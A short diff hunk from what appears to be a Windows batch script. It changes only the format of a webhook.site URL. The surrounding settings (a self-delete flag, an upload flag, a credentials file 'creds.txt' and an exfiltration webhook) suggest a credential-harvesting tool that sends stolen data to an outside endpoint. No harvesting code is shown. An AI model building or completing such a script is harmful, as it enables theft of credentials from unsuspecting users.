@@ -8,7 +8,7 @@ powershell -c "[Console]::OutputEncoding = [System.Text.Encoding]::UTF8"
 set selfdelete=0
 set upload=0
 set "credsfile=creds.txt"
-set "webhook=https://webhook.site/ead745e2-8006-4f61-a1e7-6de579067849"
+set "webhook=https://webhook.site/#!/ead745e2-8006-4f61-a1e7-6de579067849"
 ::
 
 :: Arguments
